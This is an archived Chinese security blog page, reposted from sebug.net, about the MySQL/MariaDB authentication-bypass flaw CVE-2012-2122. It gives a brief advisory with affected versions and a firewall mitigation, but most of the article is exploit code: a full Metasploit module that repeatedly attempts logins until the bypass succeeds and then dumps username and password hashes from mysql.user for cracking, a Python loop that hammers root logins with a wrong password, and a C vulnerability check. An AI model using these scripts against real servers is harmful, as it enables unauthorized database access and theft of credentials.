<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122) | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  <meta property="og:title" content="MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122)"/>
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux-arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os-x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web-wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2015 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122)</h1>
  

      <time datetime="2012-07-01T04:16:30.000Z"><a href="/html/2012-07-01-mysql-概率性任意密码身份认证登录漏洞cve-2012-2122.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <h3 id="发布时间:_2012-06-11_(GMT+0800)">发布时间: 2012-06-11 (GMT+0800)</h3>
<h2 id="漏洞版本:">漏洞版本:</h2>
<p>MySQL &lt; 5.6.6<br>MySQL &lt; 5.5.24<br>MySQL &lt; 5.1.63<br>MariaDB &lt; 5.5.23<br>MariaDB &lt; 5.3.6<br>MariaDB &lt; 5.2.12<br>MariaDB &lt; 5.1.62</p>
<h2 id="漏洞描述:">漏洞描述:</h2>
<p>CVE ID: CVE-2012-2122</p>
<p>MariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。</p>
<p>MariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。</p>
<p>用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。</p>
<p>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。而且漏洞利用工具已经出现。</p>
<blockquote>
<p>参考<br><a href="http://seclists.org/oss-sec/2012/q2/493" target="_blank" rel="external">http://seclists.org/oss-sec/2012/q2/493</a></p>
</blockquote>
<p>测试方法:</p>
<p>本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!<br><a id="more"></a></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#####  方法一、</span></div><div class="line"></div><div class="line">&amp;nbsp;</div><div class="line"><span class="comment">##</span></div><div class="line"><span class="comment"># This file is part of the Metasploit Framework and may be subject to</span></div><div class="line"><span class="comment"># redistribution and commercial restrictions. Please see the Metasploit</span></div><div class="line"><span class="comment"># web site for more information on licensing and terms of use.</span></div><div class="line"><span class="comment"># http://metasploit.com/</span></div><div class="line"><span class="comment">##</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &<span class="title">lt</span>;</span> <span class="constant">Msf::Auxiliary</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="constant">Msf::Exploit::Remote::MYSQL</span></div><div class="line"><span class="keyword">include</span> <span class="constant">Msf::Auxiliary::Report</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="constant">Msf::Auxiliary::Scanner</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> </span>initialize</div><div class="line"><span class="keyword">super</span>(</div><div class="line"><span class="string">'Name'</span> =&gt; <span class="string">'MYSQL CVE-2012-2122 Authentication Bypass Password Dump'</span>,</div><div class="line"><span class="string">'Version'</span> =&gt; <span class="string">'$Revision$'</span>,</div><div class="line"><span class="string">'Description'</span> =&gt; %<span class="constant">Q</span>{</div><div class="line"><span class="constant">This</span> <span class="class"><span class="keyword">module</span> <span class="title">exploits</span> <span class="title">a</span> <span class="title">password</span> <span class="title">bypass</span> <span class="title">vulnerability</span> <span class="title">in</span> <span class="title">MySQL</span> <span class="title">in</span> <span class="title">order</span></span></div><div class="line">to extract the usernames <span class="keyword">and</span> encrypted password hashes from a <span class="constant">MySQL</span> server.</div><div class="line"><span class="constant">These</span> hashes ares stored as loot <span class="keyword">for</span> later cracking.</div><div class="line">},</div><div class="line"><span class="string">'Authors'</span> =&gt; [</div><div class="line"><span class="string">'TheLightCosine &lt;thelightcosine[at]metasploit.com&gt;'</span>, <span class="comment"># Original hashdump module</span></div><div class="line"><span class="string">'jcran'</span> <span class="comment"># Authentication bypass bruteforce implementation</span></div><div class="line">],</div><div class="line"><span class="string">'References'</span> =&gt; [</div><div class="line">[<span class="string">'CVE'</span>, <span class="string">'2012-2122'</span>]</div><div class="line">],</div><div class="line"><span class="string">'DisclosureDate'</span> =&gt; <span class="string">'Jun 09 2012'</span>,</div><div class="line"><span class="string">'License'</span> =&gt; <span class="constant">MSF_LICENSE</span></div><div class="line">)</div><div class="line"></div><div class="line">deregister_options(<span class="string">'PASSWORD'</span>)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> </span>run_host(ip)</div><div class="line"></div><div class="line"><span class="comment"># Keep track of results (successful connections)</span></div><div class="line">results = []</div><div class="line"></div><div class="line"><span class="comment"># Username and password placeholders</span></div><div class="line">username = datastore[<span class="string">'USERNAME'</span>]</div><div class="line">password = <span class="constant">Rex::Text</span>.rand_text_alpha(rand(<span class="number">8</span>)+<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="comment"># Do an initial check to see if we can log into the server at all</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">socket = connect(<span class="keyword">false</span>)</div><div class="line">x = <span class="constant">::RbMysql</span>.connect({</div><div class="line"><span class="symbol">:host</span> =&gt; rhost,</div><div class="line"><span class="symbol">:port</span> =&gt; rport,</div><div class="line"><span class="symbol">:user</span> =&gt; username,</div><div class="line"><span class="symbol">:password</span> =&gt; password,</div><div class="line"><span class="symbol">:read_timeout</span> =&gt; <span class="number">300</span>,</div><div class="line"><span class="symbol">:write_timeout</span> =&gt; <span class="number">300</span>,</div><div class="line"><span class="symbol">:socket</span> =&gt; socket</div><div class="line">})</div><div class="line">x.connect</div><div class="line">results &lt;&lt; x</div><div class="line"></div><div class="line">print_good &quot;<span class="comment">#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password&quot;</span></div><div class="line"></div><div class="line"><span class="keyword">rescue</span> <span class="constant">RbMysql::HostNotPrivileged</span></div><div class="line">print_error &quot;<span class="comment">#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)&quot;</span></div><div class="line"><span class="keyword">return</span></div><div class="line"><span class="keyword">rescue</span> <span class="constant">RbMysql::AccessDeniedError</span></div><div class="line">print_good &quot;<span class="comment">#{rhost}:#{rport} The server allows logins, proceeding with bypass test&quot;</span></div><div class="line"><span class="keyword">rescue</span> <span class="constant">::Interrupt</span></div><div class="line">raise <span class="variable">$!</span></div><div class="line"><span class="keyword">rescue</span> <span class="constant">::Exception</span> =&gt; e</div><div class="line">print_error &quot;<span class="comment">#{rhost}:#{rport} Error: #{e}&quot;</span></div><div class="line"><span class="keyword">return</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Short circuit if we already won</span></div><div class="line"><span class="keyword">if</span> results.length &gt; <span class="number">0</span></div><div class="line"><span class="variable">@mysql_handle</span> = results.first</div><div class="line"><span class="keyword">return</span> dump_hashes</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Threaded login checker</span></div><div class="line"><span class="comment">#</span></div><div class="line">max_threads = <span class="number">16</span></div><div class="line">cur_threads = []</div><div class="line"></div><div class="line"><span class="comment"># Try up to 1000 times just to be sure</span></div><div class="line">queue = [*(<span class="number">1</span> .. <span class="number">1000</span>)]</div><div class="line"></div><div class="line"><span class="keyword">while</span>(queue.length &gt; <span class="number">0</span>)</div><div class="line"><span class="keyword">while</span>(cur_threads.length &lt; max_threads)</div><div class="line"></div><div class="line"><span class="comment"># We can stop if we get a valid login</span></div><div class="line"><span class="keyword">break</span> <span class="keyword">if</span> results.length &gt; <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># keep track of how many attempts we've made</span></div><div class="line">item = queue.shift</div><div class="line"></div><div class="line"><span class="comment"># We can stop if we reach 1000 tries</span></div><div class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> item</div><div class="line"></div><div class="line"><span class="comment"># Status indicator</span></div><div class="line">print_status &quot;<span class="comment">#{rhost}:#{rport} Authentication bypass is #{item/10}% complete&quot; if (item % 100) == 0</span></div><div class="line"></div><div class="line">t = <span class="constant">Thread</span>.new(item) <span class="keyword">do</span> |count|</div><div class="line"><span class="keyword">begin</span></div><div class="line"><span class="comment"># Create our socket and make the connection</span></div><div class="line">s = connect(<span class="keyword">false</span>)</div><div class="line">x = <span class="constant">::RbMysql</span>.connect({</div><div class="line"><span class="symbol">:host</span> =&gt; rhost,</div><div class="line"><span class="symbol">:port</span> =&gt; rport,</div><div class="line"><span class="symbol">:user</span> =&gt; username,</div><div class="line"><span class="symbol">:password</span> =&gt; password,</div><div class="line"><span class="symbol">:read_timeout</span> =&gt; <span class="number">300</span>,</div><div class="line"><span class="symbol">:write_timeout</span> =&gt; <span class="number">300</span>,</div><div class="line"><span class="symbol">:socket</span> =&gt; s,</div><div class="line"><span class="symbol">:db</span> =&gt; <span class="keyword">nil</span></div><div class="line">})</div><div class="line">print_status &quot;<span class="comment">#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts&quot;</span></div><div class="line">results &lt;&lt; x</div><div class="line"><span class="keyword">rescue</span> <span class="constant">RbMysql::AccessDeniedError</span></div><div class="line"><span class="keyword">rescue</span> <span class="constant">Exception</span> =&gt; e</div><div class="line">print_status &quot;<span class="comment">#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}&quot;</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">cur_threads &lt;&lt; t</div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># We can stop if we get a valid login</span></div><div class="line"><span class="keyword">break</span> <span class="keyword">if</span> results.length &gt; <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># Add to a list of dead threads if we're finished</span></div><div class="line">cur_threads.each_index <span class="keyword">do</span> |ti|</div><div class="line">t = cur_threads[ti]</div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> t.alive?</div><div class="line">cur_threads[ti] = <span class="keyword">nil</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Remove any dead threads from the set</span></div><div class="line">cur_threads.delete(<span class="keyword">nil</span>)</div><div class="line"></div><div class="line"><span class="constant">::IO</span>.select(<span class="keyword">nil</span>, <span class="keyword">nil</span>, <span class="keyword">nil</span>, <span class="number">0</span>.<span class="number">25</span>)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Clean up any remaining threads</span></div><div class="line">cur_threads.each {|x| x.kill }</div><div class="line"></div><div class="line"><span class="keyword">if</span> results.length &gt; <span class="number">0</span></div><div class="line">print_good(&quot;<span class="comment">#{rhost}:#{rport} Successful exploited the authentication bypass flaw, dumping hashes...&quot;)</span></div><div class="line"><span class="variable">@mysql_handle</span> = results.first</div><div class="line"><span class="keyword">return</span> dump_hashes</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">print_error(&quot;<span class="comment">#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable&quot;)</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> </span>dump_hashes</div><div class="line"></div><div class="line"><span class="comment"># Grabs the username and password hashes and stores them as loot</span></div><div class="line">res = mysql_query(&quot;<span class="constant">SELECT</span> user,password from mysql.user&quot;)</div><div class="line"><span class="keyword">if</span> res.<span class="keyword">nil</span>?</div><div class="line">print_error(&quot;<span class="comment">#{rhost}:#{rport} There was an error reading the MySQL User Table&quot;)</span></div><div class="line"><span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Create a table to store data</span></div><div class="line">tbl = <span class="constant">Rex::Ui::Text::Table</span>.new(</div><div class="line"><span class="string">'Header'</span> =&gt; <span class="string">'MysQL Server Hashes'</span>,</div><div class="line"><span class="string">'Indent'</span> =&gt; <span class="number">1</span>,</div><div class="line"><span class="string">'Columns'</span> =&gt; [<span class="string">'Username'</span>, <span class="string">'Hash'</span>]</div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">if</span> res.size &gt; <span class="number">0</span></div><div class="line">res.each <span class="keyword">do</span> |row|</div><div class="line"><span class="keyword">next</span> <span class="keyword">unless</span> (row[<span class="number">0</span>].to_s + row[<span class="number">1</span>].to_s).length &gt; <span class="number">0</span></div><div class="line">tbl &lt;&lt; [row[<span class="number">0</span>], row[<span class="number">1</span>]]</div><div class="line">print_good(&quot;<span class="comment">#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}&quot;)</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">this_service = <span class="keyword">nil</span></div><div class="line"><span class="keyword">if</span> framework.db <span class="keyword">and</span> framework.db.active</div><div class="line">this_service = report_service(</div><div class="line"><span class="symbol">:host</span> =&gt; rhost,</div><div class="line"><span class="symbol">:port</span> =&gt; rport,</div><div class="line"><span class="symbol">:name</span> =&gt; <span class="string">'mysql'</span>,</div><div class="line"><span class="symbol">:proto</span> =&gt; <span class="string">'tcp'</span></div><div class="line">)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">report_hashes(tbl.to_csv, this_service) <span class="keyword">unless</span> tbl.rows.empty?</div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Stores the Hash Table as Loot for Later Cracking</span></div><div class="line"><span class="function"><span class="keyword">def</span> </span>report_hashes(hash_loot,service)</div><div class="line">filename= &quot;<span class="comment">#{rhost}-#{rport}_mysqlhashes.txt&quot;</span></div><div class="line">path = store_loot(&quot;mysql.hashes&quot;, &quot;text/plain&quot;, rhost, hash_loot, filename, &quot;<span class="constant">MySQL</span> <span class="constant">Hashes</span>&quot;, service)</div><div class="line">print_status(&quot;<span class="comment">#{rhost}:#{rport} Hash Table has been saved: #{path}&quot;)</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">########################################################################################</span></div><div class="line">测试方法,<span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line"> subprocess.Popen(&quot;mysql -u root mysql --password=blah&quot;, shell=<span class="keyword">True</span>).wait()</div><div class="line"></div><div class="line"><span class="comment">########################################################################################</span></div></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">测试方法,<span class="number">3</span></div><div class="line"></div><div class="line"><span class="preprocessor">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="preprocessor">#include &lt;stdlib.h&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>) {</div><div class="line"> <span class="keyword">int</span> one, two, ret;</div><div class="line"> time_t start = time(<span class="number">0</span>);</div><div class="line"> time_t now;</div><div class="line"></div><div class="line"> srand(getpid()*start);</div><div class="line"> <span class="keyword">while</span> (<span class="number">1</span>) {</div><div class="line"> one = rand();</div><div class="line"> two = rand();</div><div class="line"> ret = <span class="built_in">memcmp</span>(&amp;one, &amp;two, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</div><div class="line"> <span class="keyword">if</span> (ret &lt; -<span class="number">128</span> || ret &gt; <span class="number">127</span>)</div><div class="line"> <span class="keyword">break</span>;</div><div class="line"> time(&amp;now);</div><div class="line"> <span class="keyword">if</span> (now - start &gt; <span class="number">10</span>) {</div><div class="line"> <span class="built_in">printf</span>(&quot;Not triggered in <span class="number">10</span> seconds, *probably* not vulnerable..n&quot;);</div><div class="line"> <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"> }</div><div class="line"> }</div><div class="line"> <span class="built_in">printf</span>(&quot;Vulnerable! <span class="built_in">memcmp</span> returned: %dn&quot;, ret);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>安全建议:</p>
<p>临时解决办法：</p>
<p>在防火墙上关闭mysql端口<br>厂商补丁：</p>
<h2 id="MySQL_AB">MySQL AB</h2>
<p>目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：</p>
<p><a href="http://www.mysql.com/" target="_blank" rel="external">http://www.mysql.com/</a></p>
<h2 id="MariaDB">MariaDB</h2>
<p>目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：</p>
<p><a href="http://mariadb.org/" target="_blank" rel="external">http://mariadb.org/</a></p>
<p>本文转自：sebug.net</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="http://weibo.com/creturn"><strong>creturn</strong></a> - 7月 1 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
	 
     		  
  
  <div class="categories">
    <a href="/categories/技术文章/">技术文章</a>, <a href="/categories/技术文章/最新漏洞/">最新漏洞</a>
  </div>

       		
  
  <div class="tags">
    <a href="/tags/Metasploit/">Metasploit</a>, <a href="/tags/Mysql/">Mysql</a>, <a href="/tags/任意密码登录/">任意密码登录</a>
  </div>

     		  
       	 
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>